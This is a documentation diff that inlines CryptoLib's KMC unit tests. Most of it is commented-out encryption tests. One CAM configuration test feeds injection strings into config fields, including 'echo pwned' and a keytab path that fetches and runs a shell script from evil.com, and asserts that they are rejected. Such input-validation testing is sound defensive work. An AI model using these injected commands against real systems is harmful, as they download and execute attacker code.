@@ -3,26 +3,4053 @@
 
 **경로:** `components/cryptolib/test/kmc/`
 
-## 하위 폴더 및 파일
+## 이 폴더의 파일
 
-```{toctree}
-:maxdepth: 1
+### `ut_kmc_cam.c`
 
-file--ut_kmc_cam.c
-file--ut_kmc_crypto.c
-file--ut_kmc_crypto_auth_only.c
-file--ut_kmc_crypto_cam.c
-file--ut_kmc_crypto_with_mtls_sadb.c
-file--ut_mariadb.c
-file--ut_tc_kmc.c
+**경로:** `components/cryptolib/test/kmc/ut_kmc_cam.c`
+
+
+```c
+#include "crypto.h"
+#include "utest.h"
+
+/**
+ * @brief Unit Test: KMC CAM Configs
+ **/
+UTEST(KMC_CAM, CAM_CONFIG)
+{
+    int32_t status = CRYPTO_LIB_SUCCESS;
+    // Setup & Initialize CryptoLib
+    Crypto_Config_CryptoLib(KEY_TYPE_KMC, MC_TYPE_DISABLED, SA_TYPE_MARIADB, CRYPTOGRAPHY_TYPE_KMCCRYPTO,
+                            IV_CRYPTO_MODULE, CRYPTO_TC_CREATE_FECF_TRUE, TC_PROCESS_SDLS_PDUS_TRUE, TC_HAS_PUS_HDR,
+                            TC_IGNORE_SA_STATE_FALSE, TC_IGNORE_ANTI_REPLAY_TRUE, TC_UNIQUE_SA_PER_MAP_ID_FALSE,
+                            TC_CHECK_FECF_TRUE, 0x3F, SA_INCREMENT_NONTRANSMITTED_IV_TRUE);
+
+    // check username
+    status = Crypto_Config_Cam(CAM_ENABLED_TRUE,      // cam_enabled
+                               "/path/to/cookie",     // cookie_file_path
+                               "/etc/krb5.keytab",    // keytab_file_path
+                               CAM_LOGIN_KEYTAB_FILE, // login_method
+                               "https://example.com", // access_manager_uri
+                               "user; echo pwned",    // username (MALICIOUS)
+                               "/home/cam");
+    ASSERT_EQ(CAM_CONFIG_NOT_SUPPORTED_ERROR, status);
+    printf("Cam Config Status: %d\n", status);
+
+    // check keytab filepath
+    status = Crypto_Config_Cam(CAM_ENABLED_TRUE,  // cam_enabled
+                               "/path/to/cookie", // cookie_file_path
+                               "/etc/krb5.keytab; wget http://evil.com/shell.sh -O /tmp/shell.sh; chmod +x "
+                               "/tmp/shell.sh; /tmp/shell.sh", // keytab_file_path (MALICIOUS)
+                               CAM_LOGIN_KEYTAB_FILE,          // login_method
+                               "https://example.com",          // access_manager_uri
+                               "testuser",                     // username
+                               "/home/cam"                     // cam_home
+    );
+    ASSERT_EQ(CAM_CONFIG_NOT_SUPPORTED_ERROR, status);
+    printf("Cam Config Status: %d\n", status);
+
+    // check good config
+    status = Crypto_Config_Cam(CAM_ENABLED_TRUE,      // cam_enabled
+                               "/path/to/cookie",     // cookie_file_path
+                               "/etc/krb5.keytab",    // keytab_file_path
+                               CAM_LOGIN_KEYTAB_FILE, // login_method
+                               "https://example.com", // access_manager_uri
+                               "testuser",            // username
+                               "/home/cam"            // cam_home
+    );
+    ASSERT_EQ(CRYPTO_LIB_SUCCESS, status);
+    printf("Cam Config Status: %d\n", status);
+
+    Crypto_Shutdown();
+}
+UTEST_MAIN();
 ```
 
-## 항목
+### `ut_kmc_crypto.c`
 
-- [`components/cryptolib/test/kmc/ut_kmc_cam.c`](file--ut_kmc_cam.c) — UTF-8 텍스트 파일 본문 포함
-- [`components/cryptolib/test/kmc/ut_kmc_crypto.c`](file--ut_kmc_crypto.c) — UTF-8 텍스트 파일 본문 포함
-- [`components/cryptolib/test/kmc/ut_kmc_crypto_auth_only.c`](file--ut_kmc_crypto_auth_only.c) — UTF-8 텍스트 파일 본문 포함
-- [`components/cryptolib/test/kmc/ut_kmc_crypto_cam.c`](file--ut_kmc_crypto_cam.c) — UTF-8 텍스트 파일 본문 포함
-- [`components/cryptolib/test/kmc/ut_kmc_crypto_with_mtls_sadb.c`](file--ut_kmc_crypto_with_mtls_sadb.c) — UTF-8 텍스트 파일 본문 포함
-- [`components/cryptolib/test/kmc/ut_mariadb.c`](file--ut_mariadb.c) — UTF-8 텍스트 파일 본문 포함
-- [`components/cryptolib/test/kmc/ut_tc_kmc.c`](file--ut_tc_kmc.c) — UTF-8 텍스트 파일 본문 포함
+**경로:** `components/cryptolib/test/kmc/ut_kmc_crypto.c`
+
+
+```c
+/* Copyright (C) 2009 - 2022 National Aeronautics and Space Administration.
+   All Foreign Rights are Reserved to the U.S. Government.
+
+   This software is provided "as is" without any warranty of any kind, either expressed, implied, or statutory,
+   including, but not limited to, any warranty that the software will conform to specifications, any implied warranties
+   of merchantability, fitness for a particular purpose, and freedom from infringement, and any warranty that the
+   documentation will conform to the program, or any warranty that the software will be error free.
+
+   In no event shall NASA be liable for any damages, including, but not limited to direct, indirect, special or
+   consequential damages, arising out of, resulting from, or in any way connected with the software or its
+   documentation, whether or not based upon warranty, contract, tort or otherwise, and whether or not loss was sustained
+   from, or arose out of the results of, or use of, the software, documentation or services provided hereunder.
+
+   ITC Team
+   NASA IV&V
+   jstar-development-team@mail.nasa.gov
+*/
+
+/**
+ *  Unit Tests that make use of TC_ApplySecurity/TC_ProcessSecurity function on the data with KMC Crypto Service/MariaDB
+ *Functionality Enabled.
+ **/
+#include "crypto.h"
+#include "crypto_error.h"
+#include "sa_interface.h"
+#include "utest.h"
+
+#include "crypto.h"
+#include "shared_util.h"
+#include <stdio.h>
+#include <mysql/mysql.h>
+
+// #ifdef KMC_MDB_RH
+//     #define CLIENT_CERTIFICATE "/certs/redhat-cert.pem"
+//     #define CLIENT_CERTIFICATE_KEY "/certs/redhat-key.pem"
+// #else
+//     /* KMC_MDB_DB */
+//     #define CLIENT_CERTIFICATE "/certs/debian-cert.pem"
+//     #define CLIENT_CERTIFICATE_KEY "/certs/debian-key.pem"
+// #endif
+
+// /**
+//  * @brief Unit Test: Nominal Encryption with KMC Crypto Service && JPL Unit Test MariaDB
+//  **/
+// UTEST(KMC_CRYPTO, HAPPY_PATH_APPLY_SEC_ENC_AND_AUTH)
+// {
+//     // Setup & Initialize CryptoLib
+//     Crypto_Config_CryptoLib(KEY_TYPE_KMC, MC_TYPE_DISABLED, SA_TYPE_MARIADB, CRYPTOGRAPHY_TYPE_KMCCRYPTO,
+//                             IV_INTERNAL, CRYPTO_TC_CREATE_FECF_TRUE, TC_PROCESS_SDLS_PDUS_FALSE, TC_NO_PUS_HDR,
+//                             TC_IGNORE_SA_STATE_FALSE, TC_IGNORE_ANTI_REPLAY_TRUE, TC_UNIQUE_SA_PER_MAP_ID_FALSE,
+//                             TC_CHECK_FECF_TRUE, 0x3F, SA_INCREMENT_NONTRANSMITTED_IV_TRUE);
+//     Crypto_Config_MariaDB("db-itc-kmc.nasa.gov","sadb", 3306,CRYPTO_TRUE,CRYPTO_TRUE, "/certs/ammos-ca-bundle.crt",
+//     NULL, CLIENT_CERTIFICATE, CLIENT_CERTIFICATE_KEY, NULL, "root", NULL); Crypto_Config_Kmc_Crypto_Service("https",
+//     "itc-kmc.nasa.gov", 8443, "crypto-service","/certs/ammos-ca-bundle.crt",NULL, CRYPTO_TRUE, CLIENT_CERTIFICATE,
+//     "PEM", CLIENT_CERTIFICATE_KEY, NULL, NULL); Crypto_Config_Add_Gvcid_Managed_Parameter(0, 0x0003, 55, TC_HAS_FECF,
+//     TC_NO_SEGMENT_HDRS, 1024, AOS_FHEC_NA, AOS_IZ_NA, 0); int32_t status = Crypto_Init();
+
+//     char* raw_tc_jpl_mmt_scid44_vcid1= "2003dc070001bd37";
+//     char* raw_tc_jpl_mmt_scid44_vcid1_expect = NULL;
+//     int raw_tc_jpl_mmt_scid44_vcid1_expect_len = 0;
+
+//     hex_conversion(raw_tc_jpl_mmt_scid44_vcid1, &raw_tc_jpl_mmt_scid44_vcid1_expect,
+//     &raw_tc_jpl_mmt_scid44_vcid1_expect_len);
+
+//     uint8_t* ptr_enc_frame = NULL;
+//     uint16_t enc_frame_len = 0;
+
+//     ASSERT_EQ(CRYPTO_LIB_SUCCESS, status);
+
+//     printf("Frame before encryption:\n");
+//     for (int i=0; i<raw_tc_jpl_mmt_scid44_vcid1_expect_len; i++)
+//     {
+//         printf("%02x ", (uint8_t)raw_tc_jpl_mmt_scid44_vcid1_expect[i]);
+//     }
+//     printf("\n");
+
+//     status = Crypto_TC_ApplySecurity((uint8_t* )raw_tc_jpl_mmt_scid44_vcid1_expect,
+//     raw_tc_jpl_mmt_scid44_vcid1_expect_len, &ptr_enc_frame, &enc_frame_len); ASSERT_EQ(CRYPTO_LIB_SUCCESS, status);
+
+//     printf("Frame after encryption:\n");
+//     for (int i=0; i<enc_frame_len; i++)
+//     {
+//         printf("%02x ", ptr_enc_frame[i]);
+//     }
+//     printf("\n");
+
+//     Crypto_Shutdown();
+//     free(raw_tc_jpl_mmt_scid44_vcid1_expect);
+//     free(ptr_enc_frame);
+//     ASSERT_EQ(CRYPTO_LIB_SUCCESS, status);
+// }
+// //// Commenting out test - AEAD algorithms must have a tag -- Enc only config is invalid
+// ///**
+// // * @brief Unit Test: Nominal Encryption with KMC Crypto Service && JPL Unit Test MariaDB
+// // **/
+// //UTEST(KMC_CRYPTO, HAPPY_PATH_APPLY_SEC_ENC_ONLY)
+// //{
+// //    // Setup & Initialize CryptoLib
+// //    Crypto_Config_CryptoLib(KEY_TYPE_KMC, MC_TYPE_DISABLED, SA_TYPE_MARIADB, CRYPTOGRAPHY_TYPE_KMCCRYPTO,
+// //                            IV_INTERNAL, CRYPTO_TC_CREATE_FECF_TRUE, TC_PROCESS_SDLS_PDUS_FALSE, TC_NO_PUS_HDR,
+// //                            TC_IGNORE_SA_STATE_FALSE, TC_IGNORE_ANTI_REPLAY_TRUE, TC_UNIQUE_SA_PER_MAP_ID_FALSE,
+// //                            TC_CHECK_FECF_TRUE, 0x3F, SA_INCREMENT_NONTRANSMITTED_IV_TRUE);
+// //    Crypto_Config_MariaDB("sa_user", "sa_password", "localhost","sadb", 3306, CRYPTO_FALSE, NULL, NULL, NULL, NULL,
+// 0, NULL);
+// //    Crypto_Config_Kmc_Crypto_Service("https", "asec-cmdenc-srv1.jpl.nasa.gov", 8443, "crypto-service",
+// "/home/isaleh/git/KMC/CryptoLib-IbraheemYSaleh/util/etc/local-test-cert.pem",
+// "PEM","/home/isaleh/git/KMC/CryptoLib-IbraheemYSaleh/util/etc/local-test-key.pem",NULL,"/home/isaleh/git/KMC/CryptoLib-IbraheemYSaleh/util/etc/ammos-ca-bundle.crt",
+// NULL, NULL, CRYPTO_FALSE);
+// //    Crypto_Config_Add_Gvcid_Managed_Parameter(0, 0x002C, 0, TC_HAS_FECF, TC_NO_SEGMENT_HDRS, 1024, AOS_FHEC_NA,
+// AOS_IZ_NA, 0);
+// //    Crypto_Config_Add_Gvcid_Managed_Parameter(0, 0x002C, 1, TC_HAS_FECF, TC_NO_SEGMENT_HDRS, 1024, AOS_FHEC_NA,
+// AOS_IZ_NA, 0);
+// //    Crypto_Config_Add_Gvcid_Managed_Parameter(0, 0x002C, 2, TC_HAS_FECF, TC_NO_SEGMENT_HDRS, 1024, AOS_FHEC_NA,
+// AOS_IZ_NA, 0);
+// //    Crypto_Config_Add_Gvcid_Managed_Parameter(0, 0x002C, 3, TC_HAS_FECF, TC_NO_SEGMENT_HDRS, 1024, AOS_FHEC_NA,
+// AOS_IZ_NA, 0);
+// //    int32_t status = Crypto_Init();
+// //
+// //    char* raw_tc_jpl_mmt_scid44_vcid1= "202c0808000001361c";
+// //    char* raw_tc_jpl_mmt_scid44_vcid1_expect = NULL;
+// //    int raw_tc_jpl_mmt_scid44_vcid1_expect_len = 0;
+// //
+// //    hex_conversion(raw_tc_jpl_mmt_scid44_vcid1, &raw_tc_jpl_mmt_scid44_vcid1_expect,
+// &raw_tc_jpl_mmt_scid44_vcid1_expect_len);
+// //
+// //    uint8_t* ptr_enc_frame = NULL;
+// //    uint16_t enc_frame_len = 0;
+// //
+// //    ASSERT_EQ(CRYPTO_LIB_SUCCESS, status);
+// //
+// //    printf("Frame before encryption:\n");
+// //    for (int i=0; i<raw_tc_jpl_mmt_scid44_vcid1_expect_len; i++)
+// //    {
+// //        printf("%02x ", (uint8_t)raw_tc_jpl_mmt_scid44_vcid1_expect[i]);
+// //    }
+// //    printf("\n");
+// //
+// //    status = Crypto_TC_ApplySecurity((uint8_t* )raw_tc_jpl_mmt_scid44_vcid1_expect,
+// raw_tc_jpl_mmt_scid44_vcid1_expect_len, &ptr_enc_frame, &enc_frame_len);
+// //    ASSERT_EQ(CRYPTO_LIB_SUCCESS, status);
+// //    printf("Frame after encryption:\n");
+// //    for (int i=0; i<enc_frame_len; i++)
+// //    {
+// //        printf("%02x ", ptr_enc_frame[i]);
+// //    }
+// //    printf("\n");
+// //
+// //
+// //    Crypto_Shutdown();
+// //    free(raw_tc_jpl_mmt_scid44_vcid1_expect);
+// //    free(ptr_enc_frame);
+// //    ASSERT_EQ(CRYPTO_LIB_SUCCESS, status);
+// //}
+// /**
+//  * @brief Unit Test: Nominal Encryption with KMC Crypto Service && JPL Unit Test MariaDB
+//  **/
+// UTEST(KMC_CRYPTO, HAPPY_PATH_APPLY_SEC_AUTH_ONLY)
+// {
+//     // Setup & Initialize CryptoLib
+//     Crypto_Config_CryptoLib(KEY_TYPE_KMC, MC_TYPE_DISABLED, SA_TYPE_MARIADB, CRYPTOGRAPHY_TYPE_KMCCRYPTO,
+//                             IV_INTERNAL, CRYPTO_TC_CREATE_FECF_TRUE, TC_PROCESS_SDLS_PDUS_FALSE, TC_NO_PUS_HDR,
+//                             TC_IGNORE_SA_STATE_FALSE, TC_IGNORE_ANTI_REPLAY_TRUE, TC_UNIQUE_SA_PER_MAP_ID_FALSE,
+//                             TC_CHECK_FECF_TRUE, 0x3F, SA_INCREMENT_NONTRANSMITTED_IV_TRUE);
+//     Crypto_Config_MariaDB("db-itc-kmc.nasa.gov","sadb", 3306,CRYPTO_TRUE,CRYPTO_TRUE, "/certs/ammos-ca-bundle.crt",
+//     NULL, CLIENT_CERTIFICATE, CLIENT_CERTIFICATE_KEY, NULL, "root", NULL); Crypto_Config_Kmc_Crypto_Service("https",
+//     "itc-kmc.nasa.gov", 8443, "crypto-service","/certs/ammos-ca-bundle.crt",NULL, CRYPTO_TRUE, CLIENT_CERTIFICATE,
+//     "PEM", CLIENT_CERTIFICATE_KEY, NULL, NULL); Crypto_Config_Add_Gvcid_Managed_Parameter(0, 0x0003, 56, TC_HAS_FECF,
+//     TC_NO_SEGMENT_HDRS, 1024, AOS_FHEC_NA, AOS_IZ_NA, 0); int32_t status = Crypto_Init();
+
+//     char* raw_tc_jpl_mmt_scid44_vcid1= "2003E008000001bf1a";
+//     char* raw_tc_jpl_mmt_scid44_vcid1_expect = NULL;
+//     int raw_tc_jpl_mmt_scid44_vcid1_expect_len = 0;
+
+//     hex_conversion(raw_tc_jpl_mmt_scid44_vcid1, &raw_tc_jpl_mmt_scid44_vcid1_expect,
+//     &raw_tc_jpl_mmt_scid44_vcid1_expect_len);
+
+//     uint8_t* ptr_enc_frame = NULL;
+//     uint16_t enc_frame_len = 0;
+
+//     ASSERT_EQ(CRYPTO_LIB_SUCCESS, status);
+
+//     printf("Frame before encryption:\n");
+//     for (int i=0; i<raw_tc_jpl_mmt_scid44_vcid1_expect_len; i++)
+//     {
+//         printf("%02x ", (uint8_t)raw_tc_jpl_mmt_scid44_vcid1_expect[i]);
+//     }
+//     printf("\n");
+
+//     status = Crypto_TC_ApplySecurity((uint8_t* )raw_tc_jpl_mmt_scid44_vcid1_expect,
+//     raw_tc_jpl_mmt_scid44_vcid1_expect_len, &ptr_enc_frame, &enc_frame_len); if(status != CRYPTO_LIB_SUCCESS)
+//     {
+//         Crypto_Shutdown();
+//     }
+//     ASSERT_EQ(CRYPTO_LIB_SUCCESS, status);
+//     printf("Frame after encryption:\n");
+//     for (int i=0; i<enc_frame_len; i++)
+//     {
+//         printf("%02x ", ptr_enc_frame[i]);
+//     }
+//     printf("\n");
+
+//     Crypto_Shutdown();
+//     free(raw_tc_jpl_mmt_scid44_vcid1_expect);
+//     free(ptr_enc_frame);
+//     ASSERT_EQ(CRYPTO_LIB_SUCCESS, status);
+// }
+
+// /**
+//  * @brief Unit Test: Nominal Encryption with KMC Crypto Service && JPL Unit Test MariaDB
+//  **/
+// UTEST(KMC_CRYPTO, HAPPY_PATH_PROCESS_SEC_ENC_AND_AUTH)
+// {
+//     // Setup & Initialize CryptoLib
+//     Crypto_Config_CryptoLib(KEY_TYPE_KMC, MC_TYPE_DISABLED, SA_TYPE_MARIADB, CRYPTOGRAPHY_TYPE_KMCCRYPTO,
+//                             IV_INTERNAL, CRYPTO_TC_CREATE_FECF_TRUE, TC_PROCESS_SDLS_PDUS_FALSE, TC_NO_PUS_HDR,
+//                             TC_IGNORE_SA_STATE_FALSE, TC_IGNORE_ANTI_REPLAY_TRUE, TC_UNIQUE_SA_PER_MAP_ID_FALSE,
+//                             TC_CHECK_FECF_TRUE, 0x3F, SA_INCREMENT_NONTRANSMITTED_IV_TRUE);
+//     Crypto_Config_MariaDB("db-itc-kmc.nasa.gov","sadb", 3306,CRYPTO_TRUE,CRYPTO_TRUE, "/certs/ammos-ca-bundle.crt",
+//     NULL, CLIENT_CERTIFICATE, CLIENT_CERTIFICATE_KEY, NULL, "root", NULL); Crypto_Config_Kmc_Crypto_Service("https",
+//     "itc-kmc.nasa.gov", 8443, "crypto-service","/certs/ammos-ca-bundle.crt",NULL, CRYPTO_TRUE, CLIENT_CERTIFICATE,
+//     "PEM", CLIENT_CERTIFICATE_KEY, NULL, NULL); Crypto_Config_Add_Gvcid_Managed_Parameter(0, 0x0003, 55, TC_HAS_FECF,
+//     TC_NO_SEGMENT_HDRS, 1024, AOS_FHEC_NA, AOS_IZ_NA, 0); int32_t status = Crypto_Init();
+
+//     char* enc_tc_jpl_mmt_scid44_vcid1=
+//     "2003DC250000130000000000000000000000016746C816E9C1D758FB457D8AAE7A5B83842A5A"; char*
+//     enc_tc_jpl_mmt_scid44_vcid1_expect = NULL; int enc_tc_jpl_mmt_scid44_vcid1_expect_len = 0;
+
+//     // Data=0001
+//     // IV=000000000000000000000001
+//     // AAD=00000000000000000000000000000000000000
+
+//     TC_t* tc_processed_frame;
+//     tc_processed_frame = malloc(sizeof(uint8_t) * TC_SIZE);
+
+//     hex_conversion(enc_tc_jpl_mmt_scid44_vcid1, &enc_tc_jpl_mmt_scid44_vcid1_expect,
+//     &enc_tc_jpl_mmt_scid44_vcid1_expect_len);
+
+//     uint8_t* ptr_enc_frame = NULL;
+
+//     ASSERT_EQ(CRYPTO_LIB_SUCCESS, status);
+
+//     printf("Encrypted Frame Before Processing:\n");
+//     for (int i=0; i<enc_tc_jpl_mmt_scid44_vcid1_expect_len; i++)
+//     {
+//         printf("%02x ", (uint8_t)enc_tc_jpl_mmt_scid44_vcid1_expect[i]);
+//     }
+//     printf("\n");
+
+//     status = Crypto_TC_ProcessSecurity((uint8_t* )enc_tc_jpl_mmt_scid44_vcid1_expect,
+//     &enc_tc_jpl_mmt_scid44_vcid1_expect_len, tc_processed_frame); if(status != CRYPTO_LIB_SUCCESS)
+//     {
+//         Crypto_Shutdown();
+//     }
+//     ASSERT_EQ(CRYPTO_LIB_SUCCESS, status);
+//     printf("Processed PDU:\n");
+//     for (int i=0; i<tc_processed_frame->tc_pdu_len; i++)
+//     {
+//         printf("%02x ", tc_processed_frame->tc_pdu[i]);
+//     }
+//     printf("\n");
+//     ASSERT_EQ(0x01,tc_processed_frame->tc_pdu[0]);
+
+//     Crypto_Shutdown();
+//     free(enc_tc_jpl_mmt_scid44_vcid1_expect);
+//     free(ptr_enc_frame);
+//     ASSERT_EQ(CRYPTO_LIB_SUCCESS, status);
+// }
+// //// Commenting out test - AEAD algorithms must have a tag -- Enc only config is invalid
+// ///**
+// // * @brief Unit Test: Nominal Encryption with KMC Crypto Service && JPL Unit Test MariaDB
+// // **/
+// //UTEST(KMC_CRYPTO, HAPPY_PATH_PROCESS_SEC_ENC_ONLY)
+// //{
+// //    // Setup & Initialize CryptoLib
+// //    Crypto_Config_CryptoLib(KEY_TYPE_KMC, MC_TYPE_DISABLED, SA_TYPE_MARIADB, CRYPTOGRAPHY_TYPE_KMCCRYPTO,
+// //                            IV_INTERNAL, CRYPTO_TC_CREATE_FECF_TRUE, TC_PROCESS_SDLS_PDUS_FALSE, TC_NO_PUS_HDR,
+// //                            TC_IGNORE_SA_STATE_FALSE, TC_IGNORE_ANTI_REPLAY_TRUE, TC_UNIQUE_SA_PER_MAP_ID_FALSE,
+// //                            TC_CHECK_FECF_TRUE, 0x3F, SA_INCREMENT_NONTRANSMITTED_IV_TRUE);
+// //    Crypto_Config_MariaDB("sa_user", "sa_password", "localhost","sadb", 3306, CRYPTO_FALSE, NULL, NULL, NULL, NULL,
+// 0, NULL);
+// //    Crypto_Config_Kmc_Crypto_Service("https", "asec-cmdenc-srv1.jpl.nasa.gov", 8443, "crypto-service",
+// "/home/isaleh/git/KMC/CryptoLib-IbraheemYSaleh/util/etc/local-test-cert.pem",
+// "PEM","/home/isaleh/git/KMC/CryptoLib-IbraheemYSaleh/util/etc/local-test-key.pem",NULL,"/home/isaleh/git/KMC/CryptoLib-IbraheemYSaleh/util/etc/ammos-ca-bundle.crt",
+// NULL, NULL, CRYPTO_FALSE);
+// //    Crypto_Config_Add_Gvcid_Managed_Parameter(0, 0x002C, 0, TC_HAS_FECF, TC_NO_SEGMENT_HDRS, 1024, AOS_FHEC_NA,
+// AOS_IZ_NA, 0);
+// //    Crypto_Config_Add_Gvcid_Managed_Parameter(0, 0x002C, 1, TC_HAS_FECF, TC_NO_SEGMENT_HDRS, 1024, AOS_FHEC_NA,
+// AOS_IZ_NA, 0);
+// //    Crypto_Config_Add_Gvcid_Managed_Parameter(0, 0x002C, 2, TC_HAS_FECF, TC_NO_SEGMENT_HDRS, 1024, AOS_FHEC_NA,
+// AOS_IZ_NA, 0);
+// //    Crypto_Config_Add_Gvcid_Managed_Parameter(0, 0x002C, 3, TC_HAS_FECF, TC_NO_SEGMENT_HDRS, 1024, AOS_FHEC_NA,
+// AOS_IZ_NA, 0);
+// //    int32_t status = Crypto_Init();
+// //
+// //    char* enc_tc_jpl_mmt_scid44_vcid1= "202C0816000003000000000000000000000001669CD238";
+// //    char* enc_tc_jpl_mmt_scid44_vcid1_expect = NULL;
+// //    int enc_tc_jpl_mmt_scid44_vcid1_expect_len = 0;
+// //
+// //    // IV = 000000000000000000000001
+// //
+// //    TC_t* tc_processed_frame;
+// //    tc_processed_frame = malloc(sizeof(uint8_t) * TC_SIZE);
+// //
+// //    hex_conversion(enc_tc_jpl_mmt_scid44_vcid1, &enc_tc_jpl_mmt_scid44_vcid1_expect,
+// &enc_tc_jpl_mmt_scid44_vcid1_expect_len);
+// //
+// //    uint8_t* ptr_enc_frame = NULL;
+// //
+// //    ASSERT_EQ(CRYPTO_LIB_SUCCESS, status);
+// //
+// //    printf("Encrypted Frame Before Processing:\n");
+// //    for (int i=0; i<enc_tc_jpl_mmt_scid44_vcid1_expect_len; i++)
+// //    {
+// //        printf("%02x ", (uint8_t)enc_tc_jpl_mmt_scid44_vcid1_expect[i]);
+// //    }
+// //    printf("\n");
+// //
+// //    status = Crypto_TC_ProcessSecurity((uint8_t* )enc_tc_jpl_mmt_scid44_vcid1_expect,
+// &enc_tc_jpl_mmt_scid44_vcid1_expect_len, tc_processed_frame);
+// //    // ASSERT_EQ(CRYPTO_LIB_SUCCESS, status);
+// //    // Expected to fail -- KMC Crypto Service doesn't support AES/GCM with no AAD/MAC
+// //    ASSERT_EQ(CRYPTOGRAHPY_KMC_CRYPTO_SERVICE_GENERIC_FAILURE, status);
+// //    printf("Processed PDU:\n");
+// //    // for (int i=0; i<tc_processed_frame->tc_pdu_len; i++)
+// //    for (int i=0; i<2; i++)
+// //    {
+// //        printf("%02x ", tc_processed_frame->tc_pdu[i]);
+// //    }
+// //    printf("\n");
+// //
+// //    // ASSERT_EQ(0x00,tc_processed_frame->tc_pdu[0]);
+// //    // ASSERT_EQ( 0x01,tc_processed_frame->tc_pdu[1]);
+// //
+// //    Crypto_Shutdown();
+// //    free(enc_tc_jpl_mmt_scid44_vcid1_expect);
+// //    free(ptr_enc_frame);
+// //    // ASSERT_EQ(CRYPTO_LIB_SUCCESS, status);
+// //}
+// /**
+//  * @brief Unit Test: Nominal Encryption with KMC Crypto Service && JPL Unit Test MariaDB
+//  * This doesn't work -- Apply Security Auth Only doesn't return the proper tag.
+//  **/
+// UTEST(KMC_CRYPTO, HAPPY_PATH_PROCESS_SEC_AUTH_ONLY)
+// {
+//     // Setup & Initialize CryptoLib
+//     Crypto_Config_CryptoLib(KEY_TYPE_KMC, MC_TYPE_DISABLED, SA_TYPE_MARIADB, CRYPTOGRAPHY_TYPE_KMCCRYPTO,
+//                             IV_INTERNAL, CRYPTO_TC_CREATE_FECF_TRUE, TC_PROCESS_SDLS_PDUS_FALSE, TC_NO_PUS_HDR,
+//                             TC_IGNORE_SA_STATE_FALSE, TC_IGNORE_ANTI_REPLAY_TRUE, TC_UNIQUE_SA_PER_MAP_ID_FALSE,
+//                             TC_CHECK_FECF_TRUE, 0x3F, SA_INCREMENT_NONTRANSMITTED_IV_TRUE);
+//     Crypto_Config_MariaDB("db-itc-kmc.nasa.gov","sadb", 3306,CRYPTO_TRUE,CRYPTO_TRUE, "/certs/ammos-ca-bundle.crt",
+//     NULL, CLIENT_CERTIFICATE, CLIENT_CERTIFICATE_KEY, NULL, "root", NULL); Crypto_Config_Kmc_Crypto_Service("https",
+//     "itc-kmc.nasa.gov", 8443, "crypto-service","/certs/ammos-ca-bundle.crt",NULL, CRYPTO_TRUE, CLIENT_CERTIFICATE,
+//     "PEM", CLIENT_CERTIFICATE_KEY, NULL, NULL); Crypto_Config_Add_Gvcid_Managed_Parameter(0, 0x0003, 56, TC_HAS_FECF,
+//     TC_NO_SEGMENT_HDRS, 1024, AOS_FHEC_NA, AOS_IZ_NA, 0); int32_t status = Crypto_Init();
+
+//     char* enc_tc_jpl_mmt_scid44_vcid1=
+//     "2003E02600001400000000000000000000000200018DC038398EAA968C0D8972A614E1EFE005AE"; char*
+//     enc_tc_jpl_mmt_scid44_vcid1_expect = NULL; int enc_tc_jpl_mmt_scid44_vcid1_expect_len = 0;
+
+//     // Data=0001
+//     // IV=000000000000000000000001
+//     // AAD=00000000000000000000000000000000000000
+
+//     TC_t* tc_processed_frame;
+//     tc_processed_frame = malloc(sizeof(uint8_t) * TC_SIZE);
+
+//     hex_conversion(enc_tc_jpl_mmt_scid44_vcid1, &enc_tc_jpl_mmt_scid44_vcid1_expect,
+//     &enc_tc_jpl_mmt_scid44_vcid1_expect_len);
+
+//     uint8_t* ptr_enc_frame = NULL;
+
+//     ASSERT_EQ(CRYPTO_LIB_SUCCESS, status);
+
+//     printf("Encrypted Frame Before Processing:\n");
+//     for (int i=0; i<enc_tc_jpl_mmt_scid44_vcid1_expect_len; i++)
+//     {
+//         printf("%02x ", (uint8_t)enc_tc_jpl_mmt_scid44_vcid1_expect[i]);
+//     }
+//     printf("\n");
+
+//     status = Crypto_TC_ProcessSecurity((uint8_t* )enc_tc_jpl_mmt_scid44_vcid1_expect,
+//     &enc_tc_jpl_mmt_scid44_vcid1_expect_len, tc_processed_frame);
+
+//     if(status != CRYPTO_LIB_SUCCESS)
+//     {
+//         Crypto_Shutdown();
+//     }
+//     ASSERT_EQ(CRYPTO_LIB_SUCCESS, status);
+//     // Expected to fail -- KMC doesn't support 0 cipher text input for decrypt function.
+//     // ASSERT_EQ(CRYPTOGRAHPY_KMC_CRYPTO_SERVICE_GENERIC_FAILURE, status);
+//     printf("Processed PDU:\n");
+//     for (int i=0; i<tc_processed_frame->tc_pdu_len; i++)
+//     {
+//         printf("%02x ", tc_processed_frame->tc_pdu[i]);
+//     }
+//     printf("\n");
+
+//     // ASSERT_EQ(0x00,tc_processed_frame->tc_pdu[0]);
+//     // ASSERT_EQ( 0x01,tc_processed_frame->tc_pdu[1]);
+
+//     Crypto_Shutdown();
+//     free(enc_tc_jpl_mmt_scid44_vcid1_expect);
+//     free(ptr_enc_frame);
+//     // ASSERT_EQ(CRYPTO_LIB_SUCCESS, status);
+// }
+
+// UTEST(KMC_CRYPTO, HAPPY_PATH_APPLY_SEC_ENC_AND_AUTH_AESGCM_8BYTE_MAC)
+// {
+//     // Setup & Initialize CryptoLib
+//     Crypto_Config_CryptoLib(KEY_TYPE_KMC, MC_TYPE_DISABLED, SA_TYPE_MARIADB, CRYPTOGRAPHY_TYPE_KMCCRYPTO,
+//                             IV_INTERNAL, CRYPTO_TC_CREATE_FECF_TRUE, TC_PROCESS_SDLS_PDUS_FALSE, TC_NO_PUS_HDR,
+//                             TC_IGNORE_SA_STATE_FALSE, TC_IGNORE_ANTI_REPLAY_TRUE, TC_UNIQUE_SA_PER_MAP_ID_FALSE,
+//                             TC_CHECK_FECF_TRUE, 0x3F, SA_INCREMENT_NONTRANSMITTED_IV_TRUE);
+//     Crypto_Config_MariaDB("db-itc-kmc.nasa.gov","sadb", 3306,CRYPTO_TRUE,CRYPTO_TRUE, "/certs/ammos-ca-bundle.crt",
+//     NULL, CLIENT_CERTIFICATE, CLIENT_CERTIFICATE_KEY, NULL, "root", NULL); Crypto_Config_Kmc_Crypto_Service("https",
+//     "itc-kmc.nasa.gov", 8443, "crypto-service","/certs/ammos-ca-bundle.crt",NULL, CRYPTO_TRUE, CLIENT_CERTIFICATE,
+//     "PEM", CLIENT_CERTIFICATE_KEY, NULL, NULL); Crypto_Config_Add_Gvcid_Managed_Parameter(0, 0x0003, 57, TC_HAS_FECF,
+//     TC_NO_SEGMENT_HDRS, 1024, AOS_FHEC_NA, AOS_IZ_NA, 0); int32_t status = Crypto_Init();
+
